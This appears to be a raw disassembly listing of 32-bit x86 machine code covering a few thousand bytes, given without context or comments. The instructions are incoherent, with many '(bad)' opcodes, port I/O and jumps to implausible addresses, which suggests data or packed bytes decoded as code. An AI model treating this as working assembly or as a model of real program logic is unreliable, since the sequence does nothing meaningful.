  408d9c:	outs   dx,BYTE PTR ds:[esi]
  408d9d:	repnz adc BYTE PTR [edx],al
  408da0:	sub    DWORD PTR [ebx],esp
  408da2:	sbb    bl,ah
  408da4:	mov    ds:0x4d043a4a,eax
  408da9:	cmc    
  408daa:	inc    edi
  408dab:	ins    BYTE PTR es:[edi],dx
  408dac:	push   ecx
  408dad:	xor    ah,dh
  408daf:	ss xor esp,edx
  408db2:	out    0x98,al
  408db4:	pop    es
  408db5:	inc    esp
  408db6:	call   0x79e1adac
  408dbb:	jg     0x408db9
  408dbd:	mov    DWORD PTR [esi],esp
  408dbf:	das    
  408dc0:	mov    DWORD PTR [edi],ecx
  408dc2:	cs iret 
  408dc4:	adc    dh,BYTE PTR [ecx]
  408dc6:	sub    esp,esp
  408dc8:	mov    DWORD PTR [edi+0x4f],esi
  408dcb:	inc    esp
  408dcc:	lahf   
  408dcd:	dec    esi
  408dce:	mov    al,ds:0xa25cb54b
  408dd3:	add    dl,BYTE PTR [ebx+0x4e]
  408dd6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dd7:	mov    dl,0xa8
  408dd9:	pop    es
  408dda:	fidiv  DWORD PTR [eax]
  408ddc:	push   esp
  408ddd:	fisttp WORD PTR [edi+edi*8]
  408de0:	sbb    esp,ecx
  408de2:	add    esp,ecx
  408de4:	sahf   
  408de5:	push   eax
  408de6:	clc    
  408de7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408de8:	add    eax,eax
  408dea:	lock cmp BYTE PTR [edx+ecx*8-0x6cd58758],ch
  408df2:	inc    eax
  408df3:	(bad)  
  408df5:	sar    DWORD PTR [ebx-0x5f],0x85
  408df9:	cwde   
  408dfa:	jne    0x408e78
  408dfc:	inc    eax
  408dfd:	and    DWORD PTR [ebx],esi
  408dff:	test   eax,0x5d6b5715
  408e04:	inc    ebp
  408e05:	sbb    BYTE PTR [eax-0x10],dh
  408e08:	cld    
  408e09:	inc    esp
  408e0a:	retf   0xe732
  408e0d:	dec    ecx
  408e0e:	pop    es
  408e0f:	mov    dh,0xb2
  408e11:	lods   al,BYTE PTR ds:[esi]
  408e12:	lods   eax,DWORD PTR ds:[esi]
  408e13:	adc    al,0x53
  408e15:	xchg   DWORD PTR [edi+0x3ad1274e],edi
  408e1b:	fwait
  408e1c:	xor    BYTE PTR [edx-0x7ac971fb],0xb9
  408e23:	pop    ebp
  408e24:	mov    ebp,cs
  408e26:	push   ecx
  408e27:	push   edi
  408e28:	jae    0x408e40
  408e2a:	and    eax,0x497b9d5c
  408e2f:	pop    eax
  408e30:	popa   
  408e31:	xor    BYTE PTR [ebp*1-0x63502f20],dh
  408e38:	fs jb  0x408dff
  408e3b:	adc    al,0x85
  408e3d:	arpl   bp,sp
  408e3f:	jb     0x408e3b
  408e41:	xor    DWORD PTR [edx-0xb],esp
  408e44:	scas   eax,DWORD PTR es:[edi]
  408e45:	jge    0x408e7b
  408e47:	fist   DWORD PTR [ecx-0x19ff0994]
  408e4d:	test   esp,eax
  408e4f:	hlt    
  408e50:	inc    eax
  408e51:	ds push es
  408e53:	imul   eax,esi,0xffffffbd
  408e56:	cmp    esp,DWORD PTR [eax]
  408e58:	jno    0x408df3
  408e5a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e5b:	mov    dh,0x2d
  408e5d:	ja     0x408e5d
  408e5f:	scas   al,BYTE PTR es:[edi]
  408e60:	xchg   ecx,eax
  408e61:	xor    edx,esi
  408e63:	pop    ebp
  408e64:	packuswb mm6,QWORD PTR [ecx-0x50a703e5]
  408e6b:	fs mov esi,0x454107f2
  408e71:	sub    al,0x1a
  408e73:	mov    eax,0xaacc0f12
  408e78:	dec    ebp
  408e79:	pusha  
  408e7a:	or     DWORD PTR [ecx+0x3d81e2f4],0x699423d6
  408e84:	int    0x6b
  408e86:	cs je  0x408e32
  408e89:	sar    BYTE PTR [edx-0x7b],cl
  408e8c:	jge    0x408e82
  408e8e:	(bad)  
  408e90:	sbb    al,0xd3
  408e92:	xor    cl,dl
  408e94:	shr    dl,0x48
  408e97:	out    dx,eax
  408e98:	lahf   
  408e99:	test   DWORD PTR [eax-0x14],0x6f3e93c6
  408ea0:	jl     0x408e84
  408ea2:	jmp    0x1ee0:0x78df541f
  408ea9:	fild   QWORD PTR [eax+0x2b]
  408eac:	xor    dl,BYTE PTR [edx]
  408eae:	mov    cl,0x27
  408eb0:	test   ebp,edx
  408eb2:	sub    DWORD PTR [esi],ebx
  408eb4:	data16 loopne 0x408e76
  408eb7:	pop    es
  408eb8:	push   ds
  408eb9:	mov    bx,ss
  408ebc:	dec    ebx
  408ebd:	cld    
  408ebe:	push   cs
  408ebf:	ins    DWORD PTR es:[edi],dx
  408ec0:	icebp  
  408ec1:	inc    edx
  408ec2:	lahf   
  408ec3:	push   es
  408ec4:	sbb    al,0xa
  408ec6:	out    0x49,eax
  408ec8:	jle    0x408ecc
  408eca:	inc    ebx
  408ecb:	jo     0x408f18
  408ecd:	pop    esi
  408ece:	cs xchg ebx,eax
  408ed0:	pop    edi
  408ed1:	arpl   WORD PTR [edx-0x8603299],bx
  408ed7:	ins    DWORD PTR es:[edi],dx
  408ed8:	xchg   edi,eax
  408ed9:	lods   al,BYTE PTR ds:[esi]
  408eda:	xor    eax,0x31701d98
  408edf:	sub    al,0xfb
  408ee1:	jne    0x408e79
  408ee3:	jno    0x408ecf
  408ee5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408ee6:	jge    0x408eb8
  408ee8:	std    
  408ee9:	int    0x15
  408eeb:	js     0x408f00
  408eed:	mov    ah,0xe1
  408eef:	inc    eax
  408ef0:	cmp    ecx,DWORD PTR [edi+ecx*2-0x7fe9d13a]
  408ef7:	add    BYTE PTR [eax],dh
  408ef9:	mov    bl,0xa5
  408efb:	call   0x1ed15692
  408f00:	pusha  
  408f01:	cmc    
  408f02:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  408f04:	jle    0x408f0d
  408f06:	test   ch,ah
  408f08:	popa   
  408f09:	fistp  DWORD PTR [esi+0x50e8c77b]
  408f0f:	mov    edx,0xa7aa4655
  408f14:	adc    eax,0x4b810709
  408f19:	iret   
  408f1a:	xor    al,0xb
  408f1c:	ror    BYTE PTR [ebx-0x2553ddcc],1
  408f22:	addr16 in al,dx
  408f24:	(bad)  
  408f25:	shr    BYTE PTR [ebx-0xf],1
  408f28:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f29:	pop    eax
  408f2a:	loop   0x408f2b
  408f2c:	sbb    BYTE PTR [ecx-0x693f0d9a],bh
  408f32:	test   BYTE PTR [ecx],0xed
  408f35:	fldenv [eax-0x2d]
  408f38:	ja     0x408f6f
  408f3a:	shr    DWORD PTR [ecx-0x36ec8a3b],0xcf
  408f41:	dec    edx
  408f42:	cs sbb esi,esi
  408f45:	inc    ebp
  408f46:	shl    ebx,0xb7
  408f49:	jne    0x408ef5
  408f4b:	out    dx,eax
  408f4c:	pusha  
  408f4d:	addr16 cs ss inc edi
  408f51:	push   es
  408f52:	pop    eax
  408f53:	aad    0xd2
  408f55:	jne    0x408f3e
  408f57:	fstp   QWORD PTR [edx-0xb]
  408f5a:	mov    edi,0x15cdc974
  408f5f:	call   0xb810:0x7405bcc6
  408f66:	es fwait
  408f68:	cmp    ebp,DWORD PTR [edi-0x334beba7]
  408f6e:	lea    ecx,[esi-0x6]
  408f71:	mov    ah,0xce
  408f73:	(bad)  
  408f74:	fstp   QWORD PTR [eax-0x19]
  408f77:	test   BYTE PTR [esi-0x49],0xb5
  408f7b:	mov    WORD PTR [ecx],es
  408f7d:	into   
  408f7e:	mov    bl,BYTE PTR [ebx-0x61]
  408f81:	dec    esp
  408f82:	inc    edi
  408f83:	lahf   
  408f84:	mov    dl,0x26
  408f86:	call   DWORD PTR es:[ebx-0x2cd00ed4]
  408f8d:	fist   DWORD PTR [edx+esi*4]
  408f90:	cwde   
  408f91:	mov    bl,0x15
  408f93:	(bad)  
  408f95:	mov    esi,0xff3cee95
  408f9a:	(bad)  
  408f9b:	dec    eax
  408f9c:	xor    eax,0x81abfeda
  408fa1:	call   0x8e2c5dcb
  408fa6:	pop    edi
  408fa7:	out    dx,al
  408fa8:	adc    eax,0xe693de3
  408fad:	inc    ecx
  408fae:	aaa    
  408faf:	xor    al,0xb9
  408fb1:	inc    esi
  408fb2:	mov    al,0x4c
  408fb4:	xchg   BYTE PTR [eax-0x69],dh
  408fb7:	int    0x3d
  408fb9:	mov    esi,0x35aba2b0
  408fbe:	pop    esi
  408fbf:	js     0x408f47
  408fc1:	test   al,0xa7
  408fc3:	pop    es
  408fc4:	loope  0x408fa4
  408fc6:	and    al,BYTE PTR [esi]
  408fc8:	popf   
  408fc9:	mov    ebx,0xc46e50ce
  408fce:	xor    eax,0xd330293f
  408fd3:	jp     0x408fc7
  408fd5:	(bad)  
  408fd8:	jae    0x408f74
  408fda:	enter  0x1761,0x9a
  408fde:	add    bl,BYTE PTR [ebx+0x40]
  408fe1:	sub    al,0xd8
  408fe3:	(bad)  
  408fe4:	into   
  408fe5:	jmp    0x60140ed4
  408fea:	shl    BYTE PTR [esi+0x2e1a7c0b],1
  408ff0:	in     al,dx
  408ff1:	inc    edx
  408ff2:	sar    ch,1
  408ff4:	in     eax,0xf
  408ff6:	xor    BYTE PTR [eax-0x33ac301a],0xb3
  408ffd:	gs lahf 
  408fff:	inc    ecx
  409000:	mov    DWORD PTR [edx],edi
  409002:	icebp  
  409003:	sub    BYTE PTR ds:0x812c1230,dh
  409009:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40900a:	inc    ebx
  40900b:	scas   eax,DWORD PTR es:[edi]
  40900c:	inc    ebx
  40900d:	sub    eax,0x18341dbf
  409012:	(bad)  
  409013:	dec    ebp
  409014:	retf   0xe19e
  409017:	mov    al,ds:0x89123b9
  40901c:	xchg   ebp,eax
  40901d:	cli    
  40901e:	test   al,0x12
  409020:	jg     0x40904a
  409022:	mov    cl,dl
  409024:	mov    al,0x92
  409026:	(bad)  
  409027:	sti    
  409028:	add    al,0x7c
  40902a:	jmp    0x616:0x501c53a7
  409031:	add    BYTE PTR [edi],bh
  409033:	cli    
  409034:	repnz adc BYTE PTR [ecx],ch
  409037:	out    dx,eax
  409038:	sbb    BYTE PTR [esp+edi*2+0x34127e1],bh
  40903f:	(bad)  
  409041:	push   ebp
  409042:	inc    esp
  409043:	and    edi,DWORD PTR [ecx-0x1fdba5c]
  409049:	fs (bad) 
  40904b:	dec    esp
  40904c:	and    DWORD PTR [edi-0x3fac7fc6],edi
  409052:	iret   
  409053:	xlat   BYTE PTR ds:[ebx]
  409054:	add    eax,0xd0a8401c
  409059:	arpl   WORD PTR [esp+eax*4-0x5f],bx
  40905d:	test   BYTE PTR [edi-0x7539ede5],0x40
  409064:	enter  0xa741,0x6f
  409068:	mov    ss,WORD PTR [edi-0x8]
  40906b:	dec    ebp
  40906c:	dec    edi
  40906d:	ds out 0xcd,eax
  409070:	stc    
  409071:	bound  esp,QWORD PTR [ecx-0x5c2b3ec4]
  409077:	stos   BYTE PTR es:[edi],al
  409078:	mov    esi,0xfc5d4c4
  40907d:	outs   dx,BYTE PTR ds:[esi]
  40907e:	sti    
  40907f:	lods   al,BYTE PTR ds:[esi]
  409080:	cmp    BYTE PTR [ebp+eax*2-0x40],0xe
  409085:	push   eax
  409086:	and    dh,al
  409088:	inc    BYTE PTR [eax-0x33]
  40908b:	push   0x3014debc
  409090:	les    ebp,FWORD PTR [ecx]
  409092:	push   esi
  409093:	ss ins BYTE PTR es:[di],dx
  409096:	push   edx
  409097:	sub    al,0x1a
  409099:	dec    edx
  40909a:	adc    bl,BYTE PTR [eax-0x2e]
  40909d:	std    
  40909e:	mov    bl,0x96
  4090a0:	hlt    
  4090a1:	xchg   ecx,eax
  4090a2:	cli    
  4090a3:	in     eax,0xa7
  4090a5:	jns    0x409115
  4090a7:	pop    ds
  4090a8:	rol    BYTE PTR gs:[esi+0x79a763e4],cl
  4090af:	in     eax,0xb6
  4090b1:	mov    ds:0x3c53a8a0,al
  4090b6:	add    BYTE PTR [edx+0x4d6a1f2e],ch
  4090bc:	pushf  
  4090bd:	pop    ebp
  4090be:	and    al,0xfb
  4090c0:	add    al,0xa7
  4090c2:	scas   al,BYTE PTR es:[edi]
  4090c3:	loope  0x40910a
  4090c5:	lahf   
  4090c6:	pop    esp
  4090c7:	or     esp,edi
  4090c9:	lds    ebx,FWORD PTR [edi]
  4090cb:	ins    DWORD PTR es:[edi],dx
  4090cc:	jmp    0x4090b5
  4090ce:	fstp   st(0)
  4090d0:	dec    edx
  4090d1:	or     eax,0xb5fbb53a
  4090d6:	or     DWORD PTR [esi-0x4b9b35fe],esp
  4090dc:	mov    edi,0x62438c28
  4090e1:	inc    edx
  4090e2:	jno    0x40911c
  4090e4:	xor    BYTE PTR [ebx-0x27],bl
  4090e7:	xlat   BYTE PTR ds:[ebx]
  4090e8:	and    ch,bh
  4090ea:	or     esp,ecx
  4090ec:	push   ebp
  4090ed:	not    BYTE PTR [edx]
  4090ef:	cmc    
  4090f0:	mov    bl,0x6e
  4090f2:	nop
  4090f3:	fistp  WORD PTR ss:[eax+0x5d9dc73c]
  4090fa:	jl     0x409112
  4090fc:	and    al,0xa5
  4090fe:	data16 cli 
  409100:	dec    edi
  409101:	sub    cl,BYTE PTR [ecx-0x32]
  409104:	lods   eax,DWORD PTR ds:[esi]
  409105:	dec    ebp
  409106:	xchg   edx,eax
  409107:	shl    DWORD PTR [edx+0x617a7a23],cl
  40910d:	pop    edx
  40910e:	xchg   edi,eax
  40910f:	and    BYTE PTR [eax-0x2c],al
  409112:	lock scas al,BYTE PTR es:[edi]
  409114:	int3   
  409115:	sahf   
  409116:	pop    esp
  409117:	outs   dx,BYTE PTR ds:[esi]
  409118:	adc    al,0xaf
  40911a:	test   eax,0xa037f84b
  40911f:	pop    eax
  409120:	mov    edx,0xfbf5c25c
  409125:	adc    eax,0x8ef86e90
  40912a:	dec    edi
  40912b:	mov    ebx,0x92f89227
  409130:	dec    ebp
  409131:	lahf   
  409132:	mov    eax,0xa02d200
  409137:	arpl   WORD PTR [ecx],bx
  409139:	xchg   bh,bl
  40913b:	icebp  
  40913c:	mov    ebp,0x3dda30f
  409141:	mov    ebp,0xac29ac09
  409146:	mov    ebx,0x4222717e
  40914b:	push   DWORD PTR [ebp-0x61a86a8e]
  409151:	je     0x4090ef
  409153:	aad    0xc0
  409155:	xor    al,0xd8
  409157:	sbb    DWORD PTR [edi-0x530435ed],ebx
  40915d:	adc    eax,DWORD PTR [ecx+0x27644630]
  409163:	fsub   QWORD PTR [ebp-0x4e]
  409166:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409167:	outs   dx,BYTE PTR ds:[esi]
  409168:	xor    al,0x79
  40916a:	pop    ecx
  40916b:	mov    ebx,0xdb4c5487
  409170:	cmp    eax,0xa3cdae8e
  409175:	div    DWORD PTR [edx]
  409177:	and    BYTE PTR [ebp-0x4e],bh
  40917a:	(bad)  
  40917c:	test   DWORD PTR ds:0x302b5674,edx
  409182:	sbb    esi,DWORD PTR [edi-0x51]
  409185:	xor    DWORD PTR [ebp+0x7a273ac6],edx
  40918b:	push   edi
  40918c:	icebp  
  40918d:	pop    esi
  40918e:	int3   
  40918f:	scas   eax,DWORD PTR es:[edi]
  409190:	std    
  409191:	mov    esi,0xb202acad
  409196:	adc    eax,0x78a90470
  40919b:	push   edx
  40919c:	add    cl,al
  40919e:	aam    0x48
  4091a0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4091a1:	sub    DWORD PTR [ebp-0x3a],esp
  4091a4:	jae    0x409208
  4091a6:	xor    DWORD PTR [edx],esi
  4091a8:	ficomp WORD PTR [eax-0xc7cd8fd]
  4091ae:	and    DWORD PTR [ecx+0x3de57d1],esp
  4091b4:	in     al,dx
  4091b5:	sbb    eax,0x65b3b7c2
  4091ba:	scas   eax,DWORD PTR es:[edi]
  4091bb:	je     0x40914c
  4091bd:	jae    0x4091fa
  4091bf:	inc    eax
  4091c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091c1:	bound  ecx,QWORD PTR [esp+ecx*8-0x5d]
  4091c5:	jb     0x409192
  4091c7:	cmp    dl,al
  4091c9:	in     eax,0xf8
  4091cb:	dec    eax
  4091cc:	test   eax,0xb32683c4
  4091d1:	(bad)  [esi]
  4091d3:	hlt    
  4091d4:	add    DWORD PTR [edx+0x6c54ff1a],edx
  4091da:	cs push 0xe27e2cd0
  4091e0:	test   al,0x44
  4091e2:	lds    esi,FWORD PTR [ebx]
  4091e4:	dec    ebx
  4091e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4091e6:	nop
  4091e7:	clc    
  4091e8:	fiadd  WORD PTR [edx+0x3d]
  4091eb:	call   0xf41e8c69
  4091f0:	lods   al,BYTE PTR ds:[esi]
  4091f1:	pop    ebx
  4091f2:	daa    
  4091f3:	loope  0x40923b
  4091f5:	inc    eax
  4091f6:	pop    eax
  4091f7:	push   ebx
  4091f8:	pop    ebp
  4091f9:	addr16 das 
  4091fb:	mov    bh,0x8d
  4091fd:	js     0x4091c0
  4091ff:	sub    al,BYTE PTR [ecx]
  409201:	or     ch,bh
  409203:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409204:	mov    ebx,DWORD PTR [edi+0x71]
  409207:	outs   dx,BYTE PTR ds:[esi]
  409208:	xor    al,0x3a
  40920a:	push   ds
  40920b:	dec    edx
  40920c:	rol    BYTE PTR [edx+0x2e],cl
  40920f:	fwait
  409210:	bound  edx,QWORD PTR [ebx+0x416f676e]
  409216:	loopne 0x409246
  409218:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409219:	mov    edx,0xfcb41a77
  40921e:	jmp    0x409254
  409220:	xchg   esp,eax
  409221:	popa   
  409222:	push   edi
  409223:	call   0xe7184df2
  409228:	repnz (bad) 
  40922a:	jl     0x409248
  40922c:	adc    al,0xb0
  40922e:	jno    0x4091f4
  409230:	jns    0x40925b
  409232:	jae    0x409221
  409234:	pop    edi
  409235:	imul   ecx,ebx,0x15f7b007
  40923b:	stos   DWORD PTR es:[edi],eax
  40923c:	push   ss
  40923d:	out    dx,al
  40923e:	push   ds
  40923f:	ret    0xa8a7
  409242:	sub    bl,cl
  409244:	jne    0x4091f8
  409246:	ins    DWORD PTR es:[edi],dx
  409247:	out    dx,al
  409248:	call   0x639c3815
  40924d:	test   BYTE PTR [edx],0x1b
  409250:	pop    esi
  409251:	das    
  409252:	(bad)  
  409253:	mov    dl,0x91
  409255:	pop    ss
  409256:	stc    
  409257:	xor    DWORD PTR [eax],ebp
  409259:	ja     0x4091fe
  40925b:	xor    al,0x64
  40925d:	jge    0x4092ae
  40925f:	(bad)  
  409260:	pop    edi
  409261:	jns    0x4092b2
  409263:	pop    esp
  409264:	mov    dh,0xfc
  409266:	push   0xf167ffa6
  40926b:	jmp    DWORD PTR [edx+ebp*2]
  40926e:	lods   eax,DWORD PTR ds:[esi]
  40926f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409270:	fcomp  DWORD PTR [ebp+0x2c593d18]
  409276:	popa   
  409277:	sahf   
  409278:	pop    ss
  409279:	sbb    DWORD PTR [edi-0x39],edx
  40927c:	push   ebp
  40927d:	pusha  
  40927e:	inc    eax
  40927f:	imul   ebx,DWORD PTR [esi+edx*2-0x64],0x3d
  409284:	push   ecx
  409285:	in     eax,0x38
  409287:	std    
  409288:	push   edi
  409289:	shl    BYTE PTR [esi+0x7406b767],0x63
  409290:	inc    ebx
  409291:	mov    esi,0x23e5509d
  409296:	hlt    
  409297:	xor    eax,0x1e3bee9d
  40929c:	mov    ds:0xa3c10def,al
  4092a1:	outs   dx,DWORD PTR ds:[esi]
  4092a2:	retf   0xc7d2
  4092a5:	xor    BYTE PTR [ecx],0x2d
  4092a8:	nop
  4092a9:	add    al,0xf6
  4092ab:	loope  0x40923e
  4092ad:	outs   dx,BYTE PTR ds:[esi]
  4092ae:	(bad)  
  4092af:	mov    ebx,0x821eb2dc
  4092b4:	into   
  4092b5:	push   0xe51a1142
  4092ba:	mov    ebx,0x53863de4
  4092bf:	mov    edx,0xf1e879cf
  4092c4:	rcr    DWORD PTR [ebp-0x3b54300e],1
  4092ca:	cmc    
  4092cb:	aas    
  4092cc:	imul   DWORD PTR [ecx+edi*4-0x2d]
  4092d0:	out    0x1c,al
  4092d2:	mov    dl,0x37
  4092d4:	dec    edx
  4092d5:	stos   DWORD PTR es:[edi],eax
  4092d6:	push   ebp
  4092d7:	aam    0x13
  4092d9:	mov    edx,DWORD PTR [esi+eax*1+0x510910d9]
  4092e0:	mov    ecx,0x239da2e5
  4092e5:	inc    esi
  4092e6:	pushf  
  4092e7:	dec    edx
  4092e8:	or     al,BYTE PTR [ecx-0x73c79dc2]
  4092ee:	pop    ss
  4092ef:	cmp    si,WORD PTR [ecx]
  4092f2:	sbb    edx,DWORD PTR [ecx-0x3b]
  4092f5:	dec    ecx
  4092f6:	xchg   esi,eax
  4092f7:	and    eax,DWORD PTR [ebp-0x23156a6f]
  4092fd:	dec    ebp
  4092fe:	loopne 0x40934e
  409300:	mov    ebx,0x4a3e165a
  409305:	cmc    
  409306:	mov    ebp,0x3e72fd15
  40930b:	mov    al,ds:0x563b55aa
  409310:	iret   
  409311:	lods   eax,DWORD PTR ds:[esi]
  409312:	sti    
  409313:	mov    ch,0xcb
  409315:	pop    eax
  409316:	and    BYTE PTR [ebx+esi*1-0xa200af7],dh
  40931d:	packuswb mm1,QWORD PTR [edx]
  409320:	repnz std 
  409322:	jp     0x409396
  409324:	stos   DWORD PTR es:[edi],eax
  409325:	jo     0x4092bd
  409327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409328:	mov    esi,0xba6ad850
  40932d:	(bad)  
  40932e:	retf   
  40932f:	add    bh,BYTE PTR [esi]
  409331:	aam    0x6e
  409333:	popf   
  409334:	aas    
  409335:	mov    ds:0x398dd49d,al
  40933a:	inc    edi
  40933b:	outs   dx,BYTE PTR ds:[esi]
  40933c:	pop    ebp
  40933d:	dec    esi
  40933e:	stc    
  40933f:	sbb    edx,esi
  409341:	pop    edx
  409342:	mov    al,ds:0x4f82736
  409347:	adc    BYTE PTR [edi+0x6b],al
  40934a:	fsubp  st(0),st
  40934c:	pop    ebx
  40934d:	leave  
  40934e:	or     BYTE PTR ds:0x576e2bad,cl
  409354:	fdiv   DWORD PTR [esi]
  409356:	je     0x40930e
  409358:	mov    dl,0xa2
  40935a:	ss and eax,0x5fa091c5
  409360:	push   esp
  409361:	mov    dh,0x6b
  409363:	cdq    
  409364:	or     al,0xcd
  409366:	call   0x7a60f014
  40936b:	inc    eax
  40936c:	out    0xf6,eax
  40936e:	fisub  WORD PTR [esi+0x49b0bc0e]
  409374:	mov    eax,ds:0x595839e4
  409379:	xor    eax,0xfc8d3dcc
  40937e:	xchg   esp,eax
  40937f:	mov    eax,ds:0xb28f8de6
  409384:	mov    WORD PTR [edx],?
  409386:	dec    edx
  409387:	mov    eax,ds:0x14788cb1
  40938c:	call   0x2709f467
  409391:	ins    DWORD PTR es:[edi],dx
  409392:	ins    DWORD PTR es:[edi],dx
  409393:	add    al,0xdf
  409396:	sbb    cl,BYTE PTR ds:0x63dec599
  40939c:	popf   
  40939d:	or     BYTE PTR [eax],bh
  40939f:	cdq    
  4093a0:	lock sub BYTE PTR cs:[edi],dh
  4093a4:	mov    ebp,0xbc446546
  4093a9:	in     eax,dx
  4093aa:	jbe    0x4093b0
  4093ac:	or     eax,DWORD PTR [ebp+edi*1+0x10]
  4093b0:	rol    DWORD PTR [eax+0x59],cl
  4093b3:	sahf   
  4093b4:	rcr    BYTE PTR [edx+0x1b],0x31
  4093b8:	sar    DWORD PTR [ebx],1
  4093ba:	scas   al,BYTE PTR es:[edi]
  4093bb:	mov    dl,0x2d
  4093bd:	add    eax,0xb862d2f1
  4093c2:	xor    BYTE PTR [ecx-0x3ffd74c7],cl
  4093c8:	lds    eax,FWORD PTR [edx]
  4093ca:	pop    ebp
  4093cb:	xchg   ecx,eax
  4093cc:	mov    dh,ch
  4093ce:	dec    edi
  4093cf:	(bad)  
  4093d0:	outs   dx,BYTE PTR ds:[esi]
  4093d1:	ror    BYTE PTR [esi+0x18],cl
  4093d4:	push   ebx
  4093d5:	in     al,0x77
  4093d7:	fwait
  4093d8:	mov    edi,0xc1084c57
  4093dd:	int    0x3b
  4093df:	out    0xa8,eax
  4093e1:	ins    BYTE PTR es:[edi],dx
  4093e2:	ret    
  4093e3:	adc    al,0x3b
  4093e5:	imul   edx,DWORD PTR [edi],0xffffffdf
  4093e8:	xchg   esi,eax
  4093e9:	pop    ecx
  4093ea:	mov    edx,0x84186982
  4093ef:	fcomp  QWORD PTR [esi]
  4093f1:	push   es
  4093f2:	cdq    
  4093f3:	ficomp WORD PTR [edx+0x19]
  4093f6:	mov    esp,0x5144410f
  4093fb:	sbb    BYTE PTR [esi-0x1faa3143],bl
  409401:	int    0xb9
  409403:	push   ecx
  409404:	pop    eax
  409405:	retf   
  409406:	cmp    al,0xd5
  409408:	mov    BYTE PTR [ebx],dh
  40940a:	xor    esp,DWORD PTR [ecx+0x9]
  40940d:	fmul   st,st(4)
  40940f:	xlat   BYTE PTR ds:[ebx]
  409410:	iret   
  409411:	pop    esp
  409412:	sub    eax,0x56d8cef9
  409417:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409418:	ret    
  409419:	or     al,0x7
  40941b:	and    bl,BYTE PTR [ebx+eax*1-0x76bfdd6b]
  409422:	xor    BYTE PTR ds:0x3baea1df,0xcb
  409429:	inc    edi
  40942a:	scas   eax,DWORD PTR es:[edi]
  40942b:	retf   
  40942c:	pop    edi
  40942d:	fldcw  WORD PTR [edx+0x38]
  409430:	dec    esp
  409431:	cmp    al,0xc0
  409433:	push   eax
  409434:	test   eax,0x4ea3c83c
  409439:	outs   dx,BYTE PTR ds:[esi]
  40943a:	mul    DWORD PTR [ebx+0x3d]
  40943d:	and    eax,0xbb30269b
  409442:	add    dl,dh
  409444:	pop    ecx
  409445:	xor    ah,bh
  409447:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409448:	adc    bl,BYTE PTR [eax+0x5a7074a8]
  40944e:	ja     0x40947d
  409450:	mov    esi,0x3414bfb7
  409455:	lods   eax,DWORD PTR ds:[esi]
  409456:	add    al,0x5c
  409458:	pavgw  mm6,QWORD PTR [edx-0x5a234cd7]
  40945f:	fwait
  409460:	cmp    al,0x71
  409462:	mov    ah,0xff
  409464:	xor    BYTE PTR [edi],bl
  409466:	xor    al,0x62
  409468:	and    al,0x10
  40946a:	add    ebx,DWORD PTR [ecx]
  40946c:	hlt    
  40946d:	out    dx,al
  40946e:	test   BYTE PTR [ebx-0x7f],al
  409471:	adc    BYTE PTR [ebp+0xb754d19],bh
  409477:	ror    BYTE PTR [esi-0x15cc6c85],1
  40947d:	inc    edi
  40947e:	imul   ecx,DWORD PTR [edx-0x24e20b4d],0xffffffa3
  409485:	mov    dh,BYTE PTR [edx+0x29295553]
  40948b:	rsm    
  40948d:	pop    ebx
  40948e:	repz arpl WORD PTR [edx-0x60],si
  409492:	stc    
  409493:	inc    esp
  409494:	mov    esp,0x4592387f
  409499:	xor    DWORD PTR [eax],edi
  40949b:	mov    dh,0x41
  40949d:	xor    ch,BYTE PTR [ecx]
  40949f:	dec    edi
  4094a0:	and    eax,0xb44a497b
  4094a5:	rcr    cl,cl
  4094a7:	push   esi
  4094a8:	xchg   ecx,eax
  4094a9:	push   esi
  4094aa:	adc    ah,ah
  4094ac:	adc    BYTE PTR [eax-0x71],bh
  4094af:	sub    BYTE PTR [ebx+0x400842c7],0x6d
  4094b6:	jnp    0x4094c0
  4094b8:	sub    ecx,DWORD PTR [eax-0x67]
  4094bb:	fldcw  WORD PTR ds:0x5d84cd52
  4094c1:	mov    ah,0xb1
  4094c3:	xchg   esi,eax
  4094c4:	mov    ch,0x7f
  4094c6:	cmp    al,al
  4094c8:	addr16 push esp
  4094ca:	pop    ebp
  4094cb:	jle    0x409527
  4094cd:	sbb    DWORD PTR [ebp+0x53],0xcfa983f
  4094d4:	nop
  4094d5:	repz add eax,0x83b37bc0
  4094db:	lods   al,BYTE PTR ds:[esi]
  4094dc:	dec    esp
  4094dd:	loop   0x4094ae
  4094df:	lahf   
  4094e0:	clc    
  4094e1:	sub    DWORD PTR es:0x3eea6812,edi
  4094e8:	jg     0x409502
  4094ea:	xchg   BYTE PTR [ebx-0x2a236d51],dh
  4094f0:	or     ah,ah
  4094f2:	mov    ebp,0x6f36d583
  4094f7:	add    ch,dl
  4094f9:	imul   ebp,DWORD PTR [ebx-0x16f2ccd0],0xffffff81
  409500:	add    ebx,DWORD PTR [ebx+0x73]
  409503:	adc    eax,0x15d39d4
  409508:	and    bl,BYTE PTR [eax+0x4e]
  40950b:	stc    
  40950c:	imul   eax,DWORD PTR gs:[edi+ebp*1-0xc],0x3220c03f
  409515:	pop    ds
  409516:	stos   BYTE PTR es:[edi],al
  409517:	std    
  409518:	lea    eax,[edx-0x1d]
  40951b:	das    
  40951c:	push   ebp
  40951d:	hlt    
  40951e:	in     eax,0xb8
  409520:	mov    esi,0xa7c06779
  409525:	in     eax,dx
  409526:	xchg   dl,cl
  409528:	dec    ebp
  409529:	xchg   ebx,eax
  40952a:	rcl    DWORD PTR [ecx+0x7ae23ba3],0xe3
  409531:	maxps  xmm5,xmm0
  409534:	fs mov dl,0xd1
  409537:	inc    eax
  409538:	xor    cl,BYTE PTR [edx]
  40953a:	jns    0x40958b
